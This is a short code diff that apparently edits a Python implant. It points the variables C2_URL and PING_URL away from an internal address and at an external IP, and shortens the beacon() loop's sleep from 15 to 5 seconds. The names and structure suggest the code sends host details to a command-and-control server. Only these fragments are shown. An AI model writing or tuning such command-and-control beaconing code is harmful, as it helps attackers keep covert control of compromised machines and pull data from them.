@@ -8,8 +8,12 @@ import hashlib
 import os
 import socket
 
-C2_URL = "https://10.5.41.160:8443/log"
-PING_URL = "https://10.5.41.160:8443/ping"
+C2_URL = "https://13.61.176.16:8443/log"
+PING_URL = "https://13.61.176.16:8443/ping"
+
+
+
+
 
 HOSTNAME = platform.node()
 
@@ -89,7 +93,7 @@ def beacon():
     last_ping_ts = 0
 
     while True:
-        time.sleep(15)
+        time.sleep(5)
         now = time.time()
 
         with lock:
